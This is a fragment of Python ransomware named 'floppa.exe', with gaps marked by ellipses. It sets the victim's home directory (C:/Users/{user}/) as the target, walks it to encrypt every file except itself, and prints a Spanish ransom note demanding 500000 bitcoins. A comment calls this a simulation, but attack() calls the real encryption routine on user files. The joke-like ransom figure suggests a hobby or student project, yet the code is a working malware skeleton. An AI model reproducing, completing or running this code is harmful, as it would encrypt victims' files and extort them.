...
user = os.getlogin()
directory_to_encrypt = f"C:/Users/{user}/"

# Nombre del script actual
script_name = os.path.basename(__file__)
executable_name = "floppa.exe"
...
def cifrado(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file == script_name or file == executable_name:
...
def display_ransom_note():
    ransom_note = """
    ¡Tus archivos han sido encriptados por floppa.exe!
    
    Necesitas pagar al menos 500000 bitcoins para recuperar tus archivos. 
    Usa el comando pagar() para pagarnos y te daremos la clave.
    """
    print(ransom_note)
...
def attack():
    global directory_to_encrypt, key
    # Simular la encriptación de archivos
    cifrado(directory_to_encrypt, key)
